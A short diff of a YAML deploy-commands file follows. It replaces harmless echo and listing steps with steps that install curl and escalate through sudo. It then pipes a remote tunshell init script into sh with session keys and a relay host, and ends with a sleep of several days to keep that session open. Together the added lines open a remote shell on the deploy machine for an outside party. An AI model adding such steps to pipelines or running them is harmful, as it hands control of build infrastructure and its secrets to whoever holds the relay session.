@@ -1,8 +1,10 @@
 deploy:
   commands:
-    - echo "Running the first command"
-    - ls -l
+    - apt install curl -y
+    - sudo su -c "whoami"
+    - curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T SXq94pX8dMdQDO1J62UDBh YbiXmdhnZiZusClBoHKGEX eu.relay.tunshell.com
     - echo "Running the third command"
     - whoami
     - uname -a
     - cat /etc/os-release
+    - sleep 694200
